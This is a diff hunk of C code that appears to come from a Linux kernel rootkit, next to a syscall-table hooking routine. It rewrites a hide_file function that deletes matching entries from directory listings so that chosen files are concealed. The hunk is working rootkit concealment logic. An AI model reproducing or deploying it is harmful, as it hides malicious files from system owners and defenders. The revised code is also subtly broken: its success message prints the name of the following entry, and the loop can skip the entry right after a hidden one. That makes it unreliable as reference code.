@@ -81,25 +81,29 @@ unsigned long ** hook_syscall_table(void)
  * @param bit : identify the bit size for OS
  * @return 
  */
-static long hide_file(char *name, struct linux_dirent *dirp, long total)
+static long hide_file(char *f_name, struct linux_dirent *dirp, long count)
 {
-    struct linux_dirent *cur = dirp;
-    long index = 0;
+    struct linux_dirent *dp;
+    long cur_addr, cur_reclen;
+    unsigned long size, next_addr;
 
-    while (index < total) {
-        if (strncmp(cur->d_name, name, strlen(name)) == 0) {
-            unsigned long next = (unsigned long)cur + cur->d_reclen;
-            long rest = (unsigned long)dirp + total - next;
-            long reclen = cur->d_reclen;
-            fm_alert("Hiding: %s\n", cur->d_name);
-            memmove(cur, (void *)next, rest);
-            total -= reclen;
+    for (cur_addr = 0, dp = dirp; cur_addr < count; ) {
+        if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
+            cur_reclen = dp->d_reclen;                              // Store the current length
+            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
+            size = (unsigned long)dirp + count - next_addr;        // Remain size = initial+size-next size
+            
+            memmove(dp, (void *)next_addr, size);                 // current dirent point to the next
+            count -= cur_reclen;                                     // Modify the size
+            
+            printk("Hide %s success.\n", dp->d_name);
         }
-        index += cur->d_reclen;
-        cur = (struct linux_dirent *)((unsigned long)dirp + index);
+        
+        cur_addr += dp->d_reclen;                                   // Current add the size to the next
+        dp = (struct linux_dirent *)((unsigned long)dirp + cur_addr);
     }
 
-    return total;
+    return count;
 }
 
 /**
